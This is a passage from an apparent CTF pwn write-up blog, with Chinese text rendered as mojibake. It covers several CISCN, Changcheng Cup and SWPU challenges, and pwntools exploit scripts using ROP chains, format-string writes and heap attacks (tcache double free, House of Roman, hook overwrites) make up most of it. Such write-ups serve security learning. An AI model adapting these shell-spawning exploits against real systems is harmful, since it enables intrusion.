= libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_addr + <span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ä¸œåŒ—-PWN3"><a class="header-anchor" href="#CISCN-2019ä¸œåŒ—-PWN3">Â¶</a>CISCN 2019ä¸œåŒ— PWN3</h2>
<h3 id="IDA-åˆ†æ"><a class="header-anchor" href="#IDA-åˆ†æ">Â¶</a>IDA åˆ†æ</h3>
<p>mainå‡½æ•°</p>
<p><img src="http://static.zybuluo.com/hgggg/spub8xbz8oe263t2gjkadvuj/5.png" alt="5.png-36.5kB"></p>
<p>print_chk()æ˜æ˜¾æ˜¯ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<p>è¿™ä¸ªé¢˜èƒ½ç”¨çš„å‡½æ•°å°±ä¸¤ä¸ª</p>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png" alt="3.png-31.2kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/nq6c5o48hap4cvvg7iz1vlj1/4.png" alt="4.png-22.6kB"></p>
<p>å­˜åœ¨UAF</p>
<h3 id="é¢˜ç›®æ€è·¯"><a class="header-anchor" href="#é¢˜ç›®æ€è·¯">Â¶</a>é¢˜ç›®æ€è·¯</h3>
<p>é¢˜ç›®ç»™çš„ç¯å¢ƒæ˜¯Ubuntu 18 glibc 2.27</p>
<p>è¿™é‡Œç›´æ¥å°±ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libcåœ°å€å†tcachebin double free æ¥Getshell</p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28046)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,story</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,story)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>)</span><br><span class="line">s = <span class="built_in">str</span>(p.recv(<span class="number">130</span>)).split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(s[<span class="number">7</span>],<span class="number">16</span>)-<span class="number">0x81237</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ååŒ—-PWN1"><a class="header-anchor" href="#CISCN-2019ååŒ—-PWN1">Â¶</a>[CISCN 2019ååŒ—]PWN1</h2>
<h3 id="é¢˜ç›®æ€è·¯-v2"><a class="header-anchor" href="#é¢˜ç›®æ€è·¯-v2">Â¶</a>é¢˜ç›®æ€è·¯</h3>
<p>ç®€å•çš„æ ˆæº¢å‡º + ret2text</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;BBB&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400501</span> </span><br><span class="line">pop_rdi = <span class="number">0x400793</span></span><br><span class="line">cat_flag = <span class="number">0x04007CC</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number.&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(cat_flag)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040078c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400790 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400792 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005e0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400793 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400791 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400501 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019è¥¿å—-PWN1"><a class="header-anchor" href="#CISCN-2019è¥¿å—-PWN1">Â¶</a>[CISCN 2019è¥¿å—]PWN1</h2>
<h3 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>æ¼æ´ç‚¹æ˜¯mainå‡½æ•°ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mainå‡½æ•°åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯åœ¨å‡½æ•°é€€å‡ºçš„æ—¶å€™å›å»æ‰§è¡Œ__fini_arrayé‡Œçš„å‡½æ•°</p>
<p>ç”±äºé¢˜ç›®æ˜¯&quot;No RELRO&quot;æ‰€ä»¥__fini_arrayå¯è¯»å¯å†™</p>
<p>æ‰€ä»¥æœ¬é¢˜å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™æ¥åŒæ—¶å°†__fini_array[0]å†™ä¸ºmain,printf_gotå†™ä¸ºsystem_plt</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28060</span>)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#0x80483D0 </span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment">#0x8048534 </span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">fini = <span class="number">0x0804979C</span></span><br><span class="line"></span><br><span class="line">payload = p32(fini+ <span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x0804 - 0x10) + &quot;c%4$hn&quot;    #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%5$hn&quot;                                #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x83D0 - 0x0804) + &quot;c%6$hn&quot;  #83D0</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x8534 - 0x83D0) + &quot;c%7$hn&quot;  #8534</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-é•¿åŸæ¯é™¢æ ¡ç»„-king-in-heap-1"><a class="header-anchor" href="#2021-é•¿åŸæ¯é™¢æ ¡ç»„-king-in-heap-1">Â¶</a>[2021 é•¿åŸæ¯é™¢æ ¡ç»„]king_in_heap_1</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v2"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v2">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.uaf
2.fastbin attack
3.House-of-Roman
</code></pre>
<h3 id="æ¼æ´åˆ†æ"><a class="header-anchor" href="#æ¼æ´åˆ†æ">Â¶</a>æ¼æ´åˆ†æ</h3>
<p>delete å‡½æ•°å­˜åœ¨uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">10</span> || !heaparray[index] || !lenarray[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heaparray[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ç»™å‡ºäº†printfçš„å3ä½</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="keyword">unsigned</span> __int64)&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è§£é¢˜æ­¥éª¤"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<h4 id="Step1-leak-libc"><a class="header-anchor" href="#Step1-leak-libc">Â¶</a>Step1 leak libc</h4>
<p>é¦–å…ˆåˆ©ç”¨ç»™å‡ºçš„printfçš„åä¸‰ä½è®¡ç®—å‡ºstderr+157çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br></pre></td></tr></table></figure>
<p>stderr+157:è¿™ä¸ªåç§»æ˜¯å›ºå®šï¼Œåœ¨2.23ç‰ˆæœ¬çš„libcä¸­ï¼Œä¹‹åå¡«å……0x33å°±å¯ä»¥æ”»å‡»stdoutç»“æ„ä½“ï¼Œä»è€Œå¯ä»¥åˆ¶é€ æ³„éœ²å‡ºstderr+192 çš„åœ°å€</p>
<p>ä¹‹åå°±æ˜¯ç»“åˆfastbin attackæ³„éœ²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>]) <span class="comment">#edit unsortedbin fd</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µpaylaodçš„å†™æ³•å¯ä»¥å‚è€ƒï¼š<a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></p>
<h4 id="Step2-åŠ«æŒmalloc-hook-get-shell"><a class="header-anchor" href="#Step2-åŠ«æŒmalloc-hook-get-shell">Â¶</a>Step2 åŠ«æŒmalloc_hook get shell</h4>
<p>è¿™é‡Œåˆ©ç”¨æ–¹æ³•å‚è€ƒï¼š<a href="https://blog.csdn.net/seaaseesa/article/details/103057937">https://blog.csdn.net/seaaseesa/article/details/103057937</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a class="header-anchor" href="#EXP">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-tnote"><a class="header-anchor" href="#SWPU-2020-tnote">Â¶</a>SWPU 2020 tnote</h2>
<h3 id="æ¼æ´åˆ†æ-v2"><a class="header-anchor" href="#æ¼æ´åˆ†æ-v2">Â¶</a>æ¼æ´åˆ†æ</h3>
<p>åœ¨é¢˜ç›®çš„editå‡½æ•°ä¸­å­˜åœ¨off by one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= dword_202060[v3]; ++i )  <span class="comment">//off by one</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_BYTE *)(i + qword_202080[v3]) = buf;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨off by one æ¥ä¿®æ”¹ chunk çš„szie ä½æ¥é€ æˆtacahe overlapping</p>
<h3 id="è§£é¢˜æ­¥éª¤-v2"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v2">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1:æ„é€ overlapped chunk</p>
<p>åœ¨ç”³è¯·çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œchunk2å’Œchunk4çš„å¤§å°ä¸€è‡´ï¼Œæ–¹ä¾¿ç­‰ä¸‹é‡Šæ”¾è¿›å…¥tacahe</p>
<p>ä¿®æ”¹chunk1 çš„å¤§å°ä¸º0x71ï¼Œæ­¤æ—¶chunk1å’Œchunk2é‡åˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>
<p>Step2:æ³„éœ²å †åœ°å€</p>
<p>é‡Šæ”¾chunk4å’Œchunk2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; hex 0x55c37c076000 2000</span><br><span class="line">+0000 0x55c37c076000  00 00 00 00  00 00 00 00  51 02 00 00  00 00 00 00  â”‚....â”‚....â”‚Q...â”‚....â”‚</span><br><span class="line">+0010 0x55c37c076010  00 00 00 02  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">+0020 0x55c37c076020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0060 0x55c37c076060  00 00 00 00  00 00 00 00  a0 62 07 7c  c3 55 00 00  â”‚....â”‚....â”‚.b.|â”‚.U..â”‚</span><br><span class="line">+0070 0x55c37c076070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span class="line">...</span><br><span class="line">+0250 0x55c37c076250  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  â”‚....â”‚....â”‚!...â”‚....â”‚</span><br><span class="line">+0260 0x55c37c076260  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚</span><br><span class="line">+0270 0x55c37c076270  61 61 61 61  61 61 61 61  71 00 00 00  00 00 00 00  â”‚aaaaâ”‚aaaaâ”‚q...â”‚....â”‚</span><br><span class="line">+0280 0x55c37c076280  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚....â”‚....â”‚....â”‚....â”‚</span><br><span 